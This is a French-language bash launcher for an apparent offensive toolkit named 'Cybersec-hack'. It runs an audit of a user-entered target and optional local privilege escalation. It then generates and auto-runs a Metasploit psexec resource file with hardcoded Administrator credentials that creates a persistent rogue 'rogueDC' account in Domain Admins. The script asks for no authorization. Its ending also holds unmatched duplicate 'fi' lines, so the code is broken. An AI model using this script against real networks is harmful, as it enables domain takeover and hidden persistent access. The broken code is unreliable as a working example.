#!/bin/bash

# Affiche la bannière
cat << "EOF"
┏━━━┓━━━━━┏┓━━━━━━━━━━━━━━━━━━━━━━━━━━┏┓━━━━━━━━━━━┏┓━━━━━━
┃┏━┓┃━━━━━┃┃━━━━━━━━━━━━━━━━━━━━━━━━━━┃┃━━━━━━━━━━━┃┃━━━━━━
┃┃━┗┛┏┓━┏┓┃┗━┓┏━━┓┏━┓┏━━┓┏━━┓┏━━┓━━━━━┃┗━┓┏━━┓━┏━━┓┃┃┏┓━━━━
┃┃━┏┓┃┃━┃┃┃┏┓┃┃┏┓┃┃┏┛┃━━┫┃┏┓┃┃┏━┛┏━━━┓┃┏┓┃┗━┓┃━┃┏━┛┃┗┛┛━━━━
┃┗━┛┃┃┗━┛┃┃┗┛┃┃┃━┫┃┃━┣━━┃┃┃━┫┃┗━┓┗━━━┛┃┃┃┃┃┗┛┗┓┃┗━┓┃┏┓┓━━━━
┗━━━┛┗━┓┏┛┗━━┛┗━━┛┗┛━┗━━┛┗━━┛┗━━┛━━━━━┗┛┗┛┗━━━┛┗━━┛┗┛┗┛━━━━
━━━━━┏━┛┃━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
━━━━━┗━━┛━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
EOF

echo "[+] Bienvenue dans Cybersec-hack"
echo "[+] Préparation de l'environnement..."

# Étape 1 : Installation des outils et dépendances
python3 setup.py

# Étape 2 : Demander la cible à auditer
read -p "[?] IP ou nom de domaine de la cible : " target

# Étape 3 : Nom du rapport de sortie
read -p "[?] Nom du rapport final (default: rapport_final.pdf) : " report
report=${report:-rapport_final.pdf}

# Étape 4 : Lancer l'audit complet
echo "[+] Lancement de l'audit sur $target..."
python3 main.py --target "$target" --full --output "$report"

# Étape 5 : Proposer élévation de privilèges locale
read -p "[?] Voulez-vous tenter une élévation de privilège locale ? (y/N) : " elevate
if [[ "$elevate" =~ ^[Yy]$ ]]; then
    echo "[+] Lancement de l'escalade locale de privilèges..."
    python3 priv_esc.py

    # Étape 6 : Création automatique du compte Domain Admin via Metasploit
    read -p "[?] Créer un compte Domain Admin persistant ? (y/N) : " create_admin
    if [[ "$create_admin" =~ ^[Yy]$ ]]; then
        echo "[+] Génération du script de création d'un Domain Admin..."
        cat > add_admin.rc <<EOF
use exploit/windows/smb/psexec
set RHOSTS $target
set SMBUser Administrator
set SMBPass P@ssw0rd!
set PAYLOAD windows/exec
set CMD net user rogueDC SuperPassw0rd! /add /domain && net group "Domain Admins" rogueDC /add /domain
exploit
exit
EOF
        echo "[✓] Script add_admin.rc généré. Lancement automatique de msfconsole..."
        msfconsole -r add_admin.rc
    fi
fi

    fi
fi
